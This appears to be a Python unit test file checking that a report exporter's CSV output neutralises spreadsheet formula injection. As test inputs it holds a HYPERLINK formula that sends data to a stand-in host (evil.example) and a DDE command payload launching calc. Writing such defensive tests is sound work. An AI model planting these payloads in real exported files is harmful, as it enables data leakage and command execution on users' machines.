"""Unit tests for utils/reports/exporters.py.

Pure unit tests: no DB, no network. Covers CSV export and its formula-injection
guard — a report's query/answer/error text is attacker-controlled by anyone with
write access to the knowledge base (see the security-review finding fixed here).
"""

import csv
import io

from utils.reports.exporters import to_csv, to_json, to_markdown


def _run(question="What is the refund policy?", answer="30 days.", error=None):
    return {
        "run_id": "r1",
        "report_id": "rp1",
        "knowledge_id": "k1",
        "status": "completed",
        "executed_at": "2026-08-19T00:00:00Z",
        "summary": {
            "total_queries": 1,
            "completed_queries": 1,
            "failed_queries": 0,
            "total_time_ms": 100,
            "avg_response_time_ms": 100,
            "total_tokens": 42,
        },
        "query_groups": [
            {
                "type": "independent",
                "results": [
                    {
                        "question": question,
                        "answer": answer,
                        "error": error,
                        "sources_used": [],
                        "retrieved_documents": [],
                        "response_time_ms": 100,
                        "token_usage": 42,
                    }
                ],
            }
        ],
    }


def _csv_rows(csv_text):
    return list(csv.reader(io.StringIO(csv_text)))


def test_to_csv_plain_text_is_unmodified():
    rows = _csv_rows(to_csv(_run(question="What is the refund policy?", answer="30 days.")))
    assert rows[1][1] == "What is the refund policy?"
    assert rows[1][2] == "30 days."


def test_to_csv_neutralizes_formula_leading_question():
    rows = _csv_rows(to_csv(_run(question='=HYPERLINK("http://evil.example/leak","x")')))
    assert rows[1][1].startswith("'=")


def test_to_csv_neutralizes_formula_leading_answer():
    rows = _csv_rows(to_csv(_run(answer="+cmd|'/C calc'!A1")))
    assert rows[1][2].startswith("'+")


def test_to_csv_neutralizes_formula_leading_error():
    rows = _csv_rows(to_csv(_run(error="@SUM(1,1)")))
    assert rows[1][7].startswith("'@")


def test_to_csv_neutralizes_all_formula_lead_characters():
    for lead in ("=", "+", "-", "@", "\t", "\r"):
        rows = _csv_rows(to_csv(_run(question=f"{lead}malicious")))
        assert rows[1][1].startswith("'" + lead)


def test_to_json_and_to_markdown_do_not_alter_content():
    run = _run(question="=1+1", answer="2")
    assert '"question": "=1+1"' in to_json(run)
    assert "=1+1" in to_markdown(run)
